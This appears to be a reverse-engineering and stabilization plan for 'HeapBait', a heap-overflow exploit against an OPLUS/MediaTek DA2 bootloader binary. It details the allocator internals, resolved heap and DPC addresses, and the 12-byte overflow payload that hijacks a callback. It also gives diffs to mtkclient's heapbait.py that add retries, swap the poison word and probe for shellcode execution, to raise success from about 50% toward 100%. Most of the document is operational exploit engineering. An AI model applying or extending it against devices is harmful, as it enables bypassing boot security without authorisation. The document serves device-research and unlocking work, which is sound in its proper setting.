# RE: HeapBait stabilization plan for RMX3630 OPLUS DA2 (da2_oplus.bin)

Date: 2026-10-24. Companion to `re-heapbait-vuln.md` (vulnerability map) and
`rmx3630_session_2026-10-23.md` (~50% on-device success rate).
Binary: `docs/notes/rmx3630-da2/da2_oplus.bin`, file offset 0 == VA 0x40000000.
Tool: r2 `-a arm -b 32 -m 0x40000000`, plus the host resolvers in
`mtkclient/Library/Exploit/heapbait.py` executed against the blob.

## 0. Resolved runtime constants for THIS blob (proven, host-resolver replay)

| Param | Value | How |
|---|---|---|
| heap_init VA / file off | 0x40009090 / 0x9090 | `parse_heap_init` replay: "Enter 2nd-DA" xref 0x95d8 → BL chain 0x95cc→0x95b0→0x95ac → target 0x40009090 |
| heap_base (r0) | **0x40070e00** | `resolve_register_value(preoff,0)` = movw/movt 0xe00/0x4007 |
| heap_size (r3) | **0x32000000** | heap_init computes `r3 = 0x72070e00 - 0x40070e00` in its own prologue (0x400090a8) — the resolver's r3 = end−base |
| heap struct / free-list head (r1) | **0x40069e94** | regs[1] scan (`find_heap_struct` ARM32 path) |
| dpc struct | **0x40069dec** | `find_dpc_address` replay: xref 0x8c0c → bl 0x8c00 → bl 0x8bf0 → 0x40001f08 → resolve r0 = 0x40069dec |
| dpc_addr (= struct−4) | **0x40069de8** | heapbait `extract_heap_params` |
| shellcode_addr | **0x44c70e00** | heap_base + int((0x32000000//10)*0.95) = +0x4c00000 |
| stage1 payload size | 0x1400000 + payload ≈ 20 MiB | nop_count = (0x32000000//10)//4 = 0x1400000 ARM NOPs |

`heap_init` (0x40009090) proven: `stm r1,{r0,r3}` → `[head+0]=base, [head+4]=size`;
`[head+8] = [head+0xc] = sentinel(head+8)`; `[base+8] = size`; then `b 0x40008fa0`
(insert) — **the whole 768 MiB region enters the free list as ONE node**.

## 1. Allocator mechanics (proven, 0x40008d3c / 0x40008f08 / 0x40008fa0)

* Node layout: `+0 linkA`, `+4 linkB`, `+8 size`. The free node IS the chunk
  header: after carving, `[user-0xc]=magic 0x68657061`, `[user-8]=node ptr`,
  `[user-4]=size` (0x40008e70–0x40008e7c).
* **Free list is sorted by ADDRESS, ascending, via the +4 link**; `[head+0xc]`
  (= sentinel.linkB, word 0x40069ea0) is the chain start = **lowest free node**.
  Proof: insert (0x40008fa0) walks `while (node != sentinel && node <= new)
  node = node->+4` and inserts the new node **before the first node that is
  GREATER** (`bhi` at 0x40008fc0 exits to insert-before) — that invariant only
  maintains an ascending chain; the alloc walk (0x40008dc0/dcc) follows the
  same +4 link from `[head+0xc]`.
* **Allocation = classic first-fit from the LOWEST address** (not LIFO, not
  best-fit, not highest-first — the earlier direction guess in
  `re-heapbait-vuln.md` §6 is corrected here).
* Carve is **low-end**: `user = node + 0xC`, remainder node at `node + needed`
  (0x40008e10). Needed size for `malloc(n)` = `align4(n + 0xC) + r7`
  (r7 = second arg = 0 from the malloc wrapper 0x4000a59c; min-clamped to
  0x10). So **malloc(0x1400) ⇒ chunk 0x140C**, user capacity 0x1400, and the
  *next* node starts exactly at `user + 0x1400` — the 12-byte overflow of
  stage 3 lands precisely on the next node's `{linkA, linkB, size}`.
* Split rule (0x40008e04): split only if `node_size > needed + 0xC`; otherwise
  the **whole node is consumed** (up to 0xC slack) and *no remainder node is
  created*.
* free (0x40008f08): `r0=[user-8]` (node), `r1=[user-4]` (size);
  **`str r1,[r0,#8]` @0x40008f7c** = the exploit's fire write
  (`[dpc_addr+8] = 0x40069df0 = dpc->cb`); then insert (0x40008fa0) with
  **two-direction coalescing** (0x40009010 backward, 0x4000904c forward).

## 2. Layout determinism — verdict (core question)

### 2.1 Stage 2 and stage 3 are ONE handler invocation (proven)

The 5000-A command and the download are not separate DA states. Handler
`CMD:SECURITY-SET-ALLINONE-SIGNATURE` @0x40006c1c:

```
0x40006c38  bl 0x4000d0bc     ; mxml_load_string(cmd)   <- tree + 5000-A value alloc'd
0x40006c50  bl 0x40001e48     ; get_node("da/arg/source_file")
0x40006c84  bl 0x4002ae8c     ; fp_read_host_file       <- malloc(0x1400) + recv + OVERFLOW
0x40006c9c  bl 0x4002d428     ; cache buffer            <- frees the PREVIOUS cached buffer!
0x40006cdc  bl 0x4000a5f0     ; free(download buf)      <- error path only (r5 <= -1)
0x40006ce4  bl 0x4000ea94     ; mxmlDelete(tree)        <- ALWAYS: frees ALL tree chunks
```

**Answer to the key question: NO** — the mxml tree (and the 5000-A filename
chunk inside it) is *never* freed before stage 3's `malloc(0x1400)`. There is
no cross-command LIFO reuse of the filename chunk by the 0x1400 alloc; the
filename chunk is allocated *before* the download buffer and freed *after* it,
inside the same invocation. The 50% flakiness is therefore NOT a
free-before-reuse race; it is a **victim-identity lottery** (2.3).

Also proven at 0x4002d428: it is not "process body" but a cache setter —
`if ([0x40067cf8]) free([0x40067cf8]); [0x40067cf8]=buf; [0x40067cfc]=len`.
**The previous download's buffer is guaranteed-freed at 0x4002d44c on every
download** — i.e. stage 1's 20 MiB shellcode buffer S1 is freed *during the
stage-2/3 invocation, after the overflow*. This is the only heap chunk with a
*guaranteed* post-overflow `free()` in the same invocation, which makes it the
natural deterministic victim (§3.3).

### 2.2 Allocation sequence inside the exploit invocation (proven order, inferred addresses)

1. `C2` — the ~5.2 KB XML command receive buffer (cmd_loop, ~0x1450 chunk).
2. mxml tree nodes (small, 0x18–0x40 each) + value strings.
3. `F1` — mxml value chunk for the 5000-A `source_file` (~0x1394).
4. `F2` — XML-unescape copy of the filename (0x4002aba8, ~0x1394).
5. `D` — `malloc(0x13FC+4)` ⇒ 0x140C chunk; overflow writes 12 bytes at
   `D_user+0x1400` = next node's 3 fields.
6. `free(S1)` (previous 20 MiB buffer) @0x4002d44c.
7. `mxmlDelete` frees tree chunks incl. F1/F2 @0x40006ce4.

Because the allocator is lowest-address first-fit, steps 1–5 fill the lowest
holes ≥ each size, in address order. Which physical chunk ends up directly
above `D` depends on the hole map left by **all prior traffic** (boot allocs,
SLA dummy dance, GET-HW-INFO, command retries, READY-spam-induced re-sends).

### 2.3 The three outcomes (proven mechanisms, victim identity = inference)

Let X = the chunk physically at `D_user+0x1400` (whose 3 header fields we
overwrite with `{0xDEADBEEF, dpc_addr, shellcode_addr}`):

| X is… | Consequence |
|---|---|
| an **allocated chunk freed later in the same invocation** (S1 via 0x4002d44c, or a tree chunk via mxmlDelete) | `free(X)` reads fake node → `str shellcode,[0x40069df0]` = **dpc->cb set** → next cmd_loop iteration executes `blx r4` @0x40008c28 → **SUCCESS** |
| the **remainder free-node R** above D (default when D's hole was split) | corruption is inert immediately; the **next malloc** unlinks R: `str ip,[r5]` writes 0xDEADBEEF to [0x40069de8] (benign), then `str r5,[r2,#4]` with r2=0xDEADBEEF → **Data Abort at [0xDEADBEEF+4] → DA dies** (typically before/at the response send) |
| virgin/unmapped space beyond the list tail | inert → silent no-op |

The abort path is reached with near-certainty whenever X=R, because R (highest
address, huge corrupted size) is always the first-fit choice. **The ~50% rate
is this lottery**: sometimes the hole map places D directly below S1 (or a
tree chunk), sometimes below a split remainder. This also explains why the
rate moved with unrelated prelude changes (each extra command reshapes holes).

### 2.4 recv-loop exit semantics (proven, changes the failure model)

```
0x4002b1a0  ldr r0,[sp,0x24]   ; request = packet_len global, unclamped
0x4002b1b8  blx r2             ; recv -> actual in [sp,0x7c]
0x4002b1d8  add r7,r6,r7
0x4002b1dc  cmp r7,sb
0x4002b1e0  bne 0x4002b134     ; EXACT-match exit only
```

* The loop exits **only on `r7 == sb` exactly**. The fake header sits at
  stream offset `align4(sb+4) = sb+4 > sb`, so **the exit condition can never
  be met when the overflow is delivered** — the loop always over-runs and
  terminates via recv error/timeout (→ 0x4002b044 → 0x4002b090 error send →
  return 0xC0010001). **This is fine**: the overflow bytes were already
  written, and the error path still reaches the handler epilogue
  (`free(cached-prev)` + `mxmlDelete`) where the poisoned free fires.
* Per-chunk "OK" is sent by the DA *before* each data recv (0x4002b190,
  r4="OK"@0x40042f0f), so the host's `get_response()` after `xsend(payload2)`
  (heapbait line 819) can legitimately time out/return the error packet —
  heapbait already tolerates this (no check), which is correct by accident.
* Consequence for bigger smashes (mission item C): everything the host keeps
  sending is appended at `buf+r7` sequentially — a longer stream writes
  *deeper* but the region beyond the first 12 bytes is the remainder node's
  body (free memory, inert until carved). **A 0x2000 stream adds no control;
  keep the surgical 0xC.** (Marked inference for the exact contents beyond
  X+0xC.)

## 3. Host-side engineering plan (unified diffs, ranked by impact)

### 3.1 [P0] Replace `0xDEADBEEF` with a verified-safe scratch word

Converts outcome "X = remainder R" from *delayed Data Abort* into *benign*:
the unlink then writes `scratch`→[0x40069de8] and `dpc_addr`→[scratch+4],
both harmless, the allocation from R succeeds, **the DA survives** — which is
the precondition for everything else (retry, calibration).

Scratch selection is verifiable on-device *before* the exploit: READ-REGISTER
(0x40006eec) is in the always-registered basic table. Read
0x40069de0..0x40069e00 and pick a word that is 0/unused; fallback constant
0x40069de0 (4 words below dpc_addr; verify non-critical on first run).

```diff
--- a/mtkclient/Library/Exploit/heapbait.py
+++ b/mtkclient/Library/Exploit/heapbait.py
@@ -800,9 +800,14 @@ class Heapbait(Exploitation, metaclass=LogBase):
         payload2 = bytearray(b"\x00" * USB_DATA_SIZE)
         if heap_params.is_arm64:
             payload2.extend(heap_params.dpc_addr.to_bytes(8, 'little'))
             payload2.extend(shellcode_addr.to_bytes(8, 'little'))
         else:
-            payload2.extend(int.to_bytes(0xDEADBEEF, 4, 'little'))
+            # word0 overwrites the next node's linkA. 0xDEADBEEF makes any
+            # later unlink of that node abort at [0xDEADBEEF+4] (DA death).
+            # Use a verified-scratch word so a wrong-victim run stays alive
+            # and the attempt can be retried in-session.
+            scratch = int(os.environ.get("HEAPBAIT_SCRATCH", "0x40069de0"), 16)
+            payload2.extend(int.to_bytes(scratch, 4, 'little'))
             payload2.extend(heap_params.dpc_addr.to_bytes(4, 'little'))
             payload2.extend(shellcode_addr.to_bytes(4, 'little'))
```

### 3.2 [P0] Fix `cmd_exp_call_func` — it builds the wrong command

```diff
@@ -595,7 +600,7 @@ class Heapbait(Exploitation, metaclass=LogBase):
         content = {
             "arg": [
                 f"<address>{hex(addr)}</address>",
             ]
         }
-        cmd = self.create_cmd("EXP-PATCH-MEM", content)
+        cmd = self.create_cmd("EXP-CALL-FUNC", content)
         return cmd
```

(line 597 today sends `EXP-PATCH-MEM` for a call — breaks `call_func`, used by
`apply_oplus_runtime_patches` E3 registrar re-invocation.)

### 3.3 [P1] In-session retry loop with size stepping

Each failed-but-survived attempt re-rolls the victim lottery with a different
key: stepping the stage-2 filename length by 4 changes F1/F2 chunk sizes,
which changes which hole `D` (0x140C) lands in and what is above it.
Success is detected with a harmless `CMD:EXP-PATCH-MEM` probe instead of
assuming success after CMD:START.

```diff
@@ -772,6 +777,7 @@ class Heapbait(Exploitation, metaclass=LogBase):
         ret = self.xflash.handle_allinone_signature(filename="aio.bin", data=heapbait)
         _ = ret
+        attempts = int(os.environ.get("HEAPBAIT_ATTEMPTS", "6"))
+        base_len = 5000
+        for attempt in range(attempts):
+            if self._try_bait(base_len + 4 * attempt, shellcode_addr, heap_params):
+                break
+        else:
+            self.error("Heapbait: all attempts exhausted")
+            return False
+        self.patch_da(patch_params)
+        self.info("Heapbait succeeded.")
+        return True
+
+    def _try_bait(self, name_len: int, shellcode_addr: int, heap_params) -> bool:
         # Stage 2: Heap shaping via AIO2 command with large filename.
         ...
-        ncmd = self.xflash.cmd.cmd_security_set_allinone_signature(filename=5000 * "A")
+        ncmd = self.xflash.cmd.cmd_security_set_allinone_signature(filename=name_len * "A")
         result = self.xflash.send_command(ncmd)
         if not hasattr(result, "source_file"):
             self.error("Error on stage2 :(")
-        else:
-            self.info("Heapbait Stage 2 loaded.")
+            return False            # handler failed pre-download; DA still alive
+        # log the DA's real chunk size (resolves the [0x40067A08+0x14] value)
+        self.info(f"DA packet_length = {result.packet_length:#x}")
+        if not str(getattr(result, "source_file", "")).startswith("MEM://") and \
+           "A" * 64 not in str(getattr(result, "source_file", "")):
+            self.error("stage2: source_file does not echo our filename")
+            return False
         ...  # stage3 handshake unchanged, but see 3.4
         self.xflash.ack()
-        self.patch_da(patch_params)
-        self.info("Heapbait succeeded.")
-        return True
+        # probe: is the shellcode alive? EXP-PATCH-MEM with length 0 is a no-op
+        probe = self.xflash.send_command(self.cmd_exp_patch_mem(addr=scratch_probe(), length=0))
+        if not probe:
+            self.error("Heapbait: fire did not happen (probe failed), retrying")
+            return False
+        return True
```

`probe` semantics: if the shellcode fired, the EXP command is registered and
answers; if not, the stock DA answers `ERR!UNSUPPORTED`/unknown-command —
either way the DA is alive and the next attempt can run. Only a dead USB
endpoint means the session is lost.

### 3.4 [P1] Stage-3 handshake hardening (heapbait.py lines 810–834)

* Line 816/818: the second `get_response()` result is discarded unchecked —
  keep, but **log** it: `OK` ⇒ the DA is about to recv data; empty ⇒ the DA
  never accepted the length (retry before sending the payload).
* Line 819: the response here is expected to be the DA's *error* packet
  (recv loop always over-runs, §2.4). Treat `""`/timeout as "stream possibly
  incomplete" and retry the attempt; treat any non-empty packet as progress.
* Line 820 `xsend(b"GETBAITED\0")`: if the DA's iteration-2 status recv
  consumed it as data, the expected ERR/END/START sequence shifts by one
  packet. Add one tolerant re-read: if the first `get_response()` after
  GETBAITED is empty, flush + resend GETBAITED once before declaring failure.
* Keep `OPLUS_LEGACY_HOST=1` semantics for these exchanges: a `send_command`
 *retry* around stage 2/3 would re-send the 5 KB XML and reshape the heap
 *mid-lottery — the retry must re-run the WHOLE attempt (3.3), never just the
 *transport.

### 3.5 [P2] READY-spam filter (xml_lib.py, complements OPLUS_FLUSH)

The preloader CDC endpoint keeps emitting ASCII `READY` bulk-IN packets while
DA2 runs (session log §5). `xread_stream` already resyncs on magic, but a
READY packet arriving between the stage-2 command and its response is still
counted as a failed read and can trigger the `_flush_stale(discard_all=True)`
path at the worst moment. Add a targeted filter that drops only READY-looking
packets and keeps everything else:

```diff
--- a/mtkclient/Library/DA/xmlflash/xml_lib.py
+++ b/mtkclient/Library/DA/xmlflash/xml_lib.py
@@ -302,6 +302,18 @@ class DAXML(BaseLib, metaclass=LogBase):
     def send_command(self, xmldata, noack: bool = False):
+        if os.environ.get("OPLUS_READY_FILTER", "1") == "1":
+            self._drain_ready_spam()
         ...
+    def _drain_ready_spam(self):
+        # drop only pending bulk-IN packets whose payload is the preloader's
+        # ASCII "READY" spam; never touch protocol packets (safer than the
+        # discard-all flush that killed sessions on EIO).
+        try:
+            rx = self.mtk.port.cdc.rxleft
+            rx[:] = [b for b in rx if not (len(b) >= 5 and b[:5] == b"READY")]
+        except Exception:
+            pass
```

Call it explicitly before stage 2 in `_try_bait` as well.

### 3.6 [P2, optional] Calibration for a one-shot deterministic layout

The success case requires `D`'s hole to be whole-consumed
(`size ∈ (0x140C, 0x1418]`) and adjacent-below a guaranteed-freed chunk
(best candidate: the cached-previous download buffer S1, freed at
0x4002d44c — proven). The hole below S1 is the merge of stage-1's freed
prefix chunks (cmd buffer C1 + tree + F-chunks) — all sizes host-influenced.
With 3.1+3.3 making failures free, bisect `sb`/filename-length offline-style
across sessions to find the whole-consumption point; then hardcode
`sb = H - 0x10` (chunk = align4(sb+4)+0xC = H) for a single-shot ~100%.
Marked inference/design: needs one calibration campaign; the merge sizes are
stable only if the prelude command sequence is byte-identical every run
(campaign loop already ensures this).

## 4. Optional DA-side `patch_mem` assists (grounded in code)

Only usable from an already-fired session (or to harden subsequent runs):

1. **NOP the forward-coalesce abort write** — the crash in outcome X=R comes
   from `str r5,[r3,#4]` @**0x40009080** (r3 = corrupted linkA). Patch
   0x40009080 → `mov r0,r0` (0xE1A00000). Backward coalesce (0x40009010) is
   safe against a corrupted R (its size field fails the adjacency compare at
   0x40009018/0x4000905c). Effect: corrupted-remainder runs become fully
   benign even without host change 3.1.
2. **Clamp the recv request** — replace `ldr r0,[sp,0x24]` @0x4002b1a0 with a
   load of `min(packet_len, sb-r7)`: not expressible in one instruction; a
   code-cave stub is possible but unnecessary once the host keeps the 0xC
   surgical overflow. Listed for completeness.
3. **Pre-seed dpc->cb = 0 before each attempt** via
   `patch_mem(0x40069df0, b"\x00"*4)` between retries — restores the DPC-idle
   precondition if a partially-successful attempt left cb set with a stale
   value (would otherwise fire into a stale pointer on the next loop pass).

## 5. Early-failure detection points (mission item E)

| Symptom | Detection | DA state after | Action |
|---|---|---|---|
| stage2 returns non-DwnFile | `hasattr(result,"source_file")` false (heapbait L782) | alive (handler errored pre-download) | retry attempt (3.3) |
| stage2 DwnFile but source_file ≠ our name | string check (3.3) | alive | retry |
| first stage3 ack ≠ "OK" | unchecked today (L812) — add check | alive, pre-malloc | retry, no heap damage |
| response after payload empty/timeout | L819 unchecked — add heuristic (§3.4) | unknown; overflow may be partial | one GETBAITED retry, then next attempt |
| GETBAITED ≠ ERR / missing CMD:END/CMD:START | existing checks (L822–833) | alive if responses came | flush + resend GETBAITED once, else next attempt |
| EXP probe silent / EIO | new probe (3.3) | dead (abort during a later malloc/unlink, or USB desync) | full re-init: new preloader catch, delete `.state` |

With 3.1 (+ optionally §4.1) all in-invocation failure modes become
"alive → retry", so a session success probability becomes
`1-(1-p)^N` (p ≈ 0.5 per attempt ⇒ N=6 ⇒ ~98%), without re-entering the
preloader. The calibration path (3.6) is the route to a single-shot ~100%.

## 6. Confidence ledger

* Proven (disassembly): allocator policy/sort direction/carve/split/coalesce;
  heap_init single-node init; recv exact-match exit; per-chunk OK position;
  0x4002d428 = cache+free-previous; handler alloc/free order; unlink abort
  address; resolved constants (§0).
* Inference (strong): victim-identity explanation of the 50%; S1 as the
  natural deterministic victim; retry-independence of consecutive attempts;
  calibration stability across sessions.
* Unknown (needs one on-device run): exact value of the packet_len global
  (log it per 3.3), the live hole map, the recv timeout duration.
